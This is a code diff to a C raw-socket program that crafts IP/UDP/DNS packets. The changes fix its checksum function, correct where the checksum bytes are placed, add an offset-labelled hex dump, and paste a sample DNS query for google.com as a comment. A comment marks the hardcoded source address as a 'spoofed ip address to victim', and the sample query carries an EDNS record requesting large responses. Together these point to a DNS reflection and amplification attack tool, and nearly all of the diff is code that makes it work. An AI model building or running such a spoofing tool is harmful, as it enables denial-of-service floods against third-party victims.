@@ -157,7 +157,7 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char
 bool
 insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
-checksum(const long* addr, int count);
+checksum(const uint16_t* addr, size_t count);
 
 int
 main(int argc, char** argv)
@@ -166,7 +166,7 @@ main(int argc, char** argv)
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
 
     struct sockaddr_in addr, srcaddr;
-    size_t buflen, nwritten, szdatagram;
+    size_t buflen, nwritten, szdatagram, i, j;
     int raw_sockfd;
     bool status;
 
@@ -227,13 +227,16 @@ main(int argc, char** argv)
     sendto(raw_sockfd, datagram, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
     close(raw_sockfd);
 #else 
-    for (int i = 0; i < nwritten; i++) {
-        if (i % 16 == 0)
-            printf("\n");
+    for (j = 0, i = 0; i < nwritten; i++) {
+        if (i % 16 == 0) {
+            printf("\n0x%.4x: ", j);
+            j += 16;
+        }
         if (i % 2 == 0)
             printf(" ");
         printf("%.2x", datagram[ i ]);
     }
+    printf("\n%2x\n", i);
 #endif
     return 0;
 fail_close:
@@ -251,8 +254,8 @@ pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* destip, const char
     memset(iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IPVER;
     iphdr->ihl = IHL_MIN;
-    iphdr->tot_len = 0x51; // (iphdr->ihl << 2) + udpsz + nwritten;
-    iphdr->id = 0xa060; //ID;
+    iphdr->tot_len = 0x4f; // (iphdr->ihl << 2) + udpsz + nwritten;
+    iphdr->id = 0xc47e; //ID;
     iphdr->ttl = 0x40; //0xff;
     iphdr->protocol = getprotobyname("udp")->p_proto;
     iphdr->saddr = htonl(inet_addr("10.137.0.16")); // htonl(inet_addr(sourceip)); // spoofed ip address to victim
@@ -305,11 +308,18 @@ pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
     dnshdr->nscount = NSCOUNT;
     dnshdr->arcount = ARCOUNT;
 }
-
+/*
+ * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
+ *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
+ *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
+ *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
+ *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
+ */
 bool
 insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
 {
     bool status;
+    uint8_t* bufptr = *buf;
     uint8_t first_byte;
 
     status = true;
@@ -325,33 +335,14 @@ insert_ip_header(uint8_t** buf, size_t* buflen, IPHEADER* header)
     status &= insert_dword(buf, buflen, header->saddr);
     status &= insert_dword(buf, buflen, header->daddr);
 
-    header->check = checksum(( const long* ) &header, ( int ) header->ihl << 2);
+    header->check = checksum(( const uint16_t* ) bufptr, ( size_t ) header->ihl << 2);
     *buf -= 0xa;
-    *(*buf)++ = header->check << 8;
+    *(*buf)++ = (header->check & 0xff00) >> 8;
     **buf = header->check & 0xff;
-    *buf += 8;
+    *buf += 9;
 
     return status;
 }
-
-// typedef struct __attribute__((packed, aligned(1)))
-// {
-//     uint32_t sourceaddr;
-//     uint32_t destaddr;
-
-// #if __BYTE_ORDER == __BIGENDIAN 
-//     uint32_t zero : 8;
-//     uint32_t protocol : 8;
-//     uint32_t udplen : 16;
-// #endif
-
-// #if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-//     uint32_t udplen : 16;
-//     uint32_t protocol : 8;
-//     uint32_t zero : 8;
-// #endif
-// } PSEUDOHDR;
-
 
 bool
 insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader)
@@ -373,7 +364,7 @@ insert_udp_header(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* p
     insert_byte(&pseudoptr, &i, pseudoheader->protocol);
     insert_word(&pseudoptr, &i, pseudoheader->udplen);
 
-    header->uh_sum = checksum(( const long* ) &pseudo, 12);
+    header->uh_sum = checksum(( const uint16_t* ) pseudo, 12);
 
     return status;
 }
@@ -459,22 +450,29 @@ insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 
     return true;
 }
+/*
+ * 	0x0000:  4500 004f c47e 0000 4011 9ffb 0a89 0010  E..O.~..@.......
+ *	0x0010:  0a8b 0101 9955 0035 003b 1671 514e 0120  .....U.5.;.qQN..
+ *	0x0020:  0001 0000 0000 0001 0667 6f6f 676c 6503  .........google.
+ *	0x0030:  636f 6d00 0001 0001 0000 2910 0000 0000  com.......).....
+ *	0x0040:  0000 0c00 0a00 085f 2870 ddb8 d601 89    ......._(p.....
+ */
 
 uint16_t
-checksum(const long* addr, int count)
+checksum(const uint16_t* addr, size_t count)
 {
-    register long sum = 0;
+    register uint64_t sum = 0;
 
     while (count > 1) {
-        sum += *( unsigned short* ) addr++;
+        sum += *( uint16_t* ) addr++;
         count -= 2;
     }
 
     if (count > 0)
-        sum += *( unsigned char* ) addr;
+        sum += *( uint8_t* ) addr;
 
     while (sum >> 16)
         sum = (sum & 0xffff) + (sum >> 16);
 
-    return ~sum;
+    return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
 }
